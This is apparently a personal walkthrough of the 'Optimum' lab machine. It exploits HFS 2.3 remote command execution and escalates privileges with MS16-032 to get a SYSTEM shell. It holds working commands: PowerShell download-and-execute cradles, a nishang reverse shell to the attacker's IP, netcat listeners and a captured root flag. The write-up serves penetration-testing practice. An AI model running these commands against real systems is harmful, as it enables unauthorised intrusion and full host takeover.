#windows
# Enumeration
## Nmap port scanning

```
nmap -sC -sV optimum.htb  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 02:28 EST
Nmap scan report for optimum.htb (10.129.9.158)
Host is up (0.18s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.62 seconds
```

## Visit the website

http://optimum.htb
![[Pasted image 20230214163433.png]]

HttpFileServer 2.3 
There is a user login.

## Searchsploit

```
earchsploit HttpFileServer
----------------------- ---------------------------------
 Exploit Title         |  Path
----------------------- ---------------------------------
Rejetto HttpFileServer | windows/webapps/49125.py
----------------------- ---------------------------------
Shellcodes: No Results  
```
Vulnerable to remote command execution

### Get exploit
`searchsploit -m 49125`

### RCE

prepare tcpdump and try ping through RCE
`sudo tcpdump -i tun0 icmp`

```
python3 49125.py optimum.htb 80 "ping.exe -n 1 10.10.14.9"
http://optimum.htb:80/?search=%00{.+exec|ping.exe%20-n%201%2010.10.14.9.}
```

```
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
07:51:25.683344 IP optimum.htb > 10.10.14.9: ICMP echo request, id 1, seq 1, length 40
07:51:25.683364 IP 10.10.14.9 > optimum.htb: ICMP echo reply, id 1, seq 1, length 40
07:51:25.684157 IP optimum.htb > 10.10.14.9: ICMP echo request, id 1, seq 2, length 40
07:51:25.684165 IP 10.10.14.9 > optimum.htb: ICMP echo reply, id 1, seq 2, length 40
07:51:25.684170 IP optimum.htb > 10.10.14.9: ICMP echo request, id 1, seq 3, length 40
07:51:25.684172 IP 10.10.14.9 > optimum.htb: ICMP echo reply, id 1, seq 3, length 40
07:51:25.686484 IP optimum.htb > 10.10.14.9: ICMP echo request, id 1, seq 4, length 40
07:51:25.686490 IP 10.10.14.9 > optimum.htb: ICMP echo reply, id 1, seq 4, length 40
```

# Foothold
## Get shell

https://github.com/samratashok/nishang/tree/master/Shells
We use the Invoke-PowerShellTcp.ps1 file and add the following line at the end 
```
Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.9 -Port 4444
```
![[Pasted image 20230214220947.png]]

### Using the code
1. Shell 1 The exploitation code
```
python3 49125.py optimum.htb 80 "powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.9:8080/revshell.ps1')"
```

The victim machine does not have the revshell.ps1 code yet, and we need to upload this file after running the exploitation code.
In order to perform this, we prepare a python server for upload purpose.
Our objective is to get the reverse shell, so we also need to run a netcat for that.

There are three consoles total, one for the exploitaition code, another for the python server, and the last one for reverse shell.

2. Shell 2 Python server
`python3 -m http.server 8080`
3. Shell 3 nc listener for reverse shell
`nc -lvpn 4444`


## User flag
We successfully obtained kostas's shell. Now we can find the user flag.
`PS C:\Users\kostas\Desktop> type user.txt`

# Privilege Escalation
## Enumeration
### Sherlock.ps1
`wget [https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1](https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1)`

```
grep -i function Sherlock.ps1
function Get-FileVersionInfo ($FilePath) {
function Get-InstalledSoftware($SoftwareName) {
function Get-Architecture {
function Get-CPUCoreCount {
function New-ExploitTable {
function Set-ExploitTable ($MSBulletin, $VulnStatus) {
function Get-Results {
function Find-AllVulns {
function Find-MS10015 {
function Find-MS10092 {
function Find-MS13053 {
function Find-MS13081 {
function Find-MS14058 {
function Find-MS15051 {
function Find-MS15078 {
function Find-MS16016 {
function Find-MS16032 {
function Find-MS16034 {
function Find-CVE20177199 {
function Find-MS16135 {
```

### Append finding all vulns
```
echo "Find-AllVulns" >> Sherlock.ps1
```

```
iex(new-object net.webclient).downloadstring('http://10.10.14.9:8080/Sherlock.ps1')
```

It takes a while and the result below
```
Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable

```

```
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
```
exploit-db has this vuln so lets try it

## Exploit
```
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1
```

append the following at the end of Invoke-MS16032.ps1
```
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.9:8080/revshell.ps1')"
```

```
iex(new-object net.webclient).downloadstring('http://10.10.14.9:8080/Invoke-MS16032.ps1')
```

Unable to run it
```
PS C:\Users\kostas\Desktop> iex(new-object net.webclient).downloadstring('http://10.10.14.9:8080/Invoke-MS16032.ps1')
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]
[!] No valid thread handles were captured, exiting!

```

Open another nc listener
and run MS16032 again
```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.129.9.158] 49201
Windows PowerShell running as user OPTIMUM$ on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop>whoami
nt authority\system

```

## Root flag
```
PS C:\Users\Administrator\Desktop> type root.txt
c93bcce77fd547f6260f5c73996cc077
```

Prepare python server
Prepare listener for reverse shell
Execute exploit code that downloads necessary thing for reverse shell and use the code to connect to the kali nc
we get kostas user

Download Sherlock on kali machine
On kostas, check vuln using the Sherlock after getting the code through python server

There is a vuln and we obtain the code on kali machine
Modify the vuln code on kali
Run nc with port 4444 again
Run the code on kostas
We get root shell on the new nc
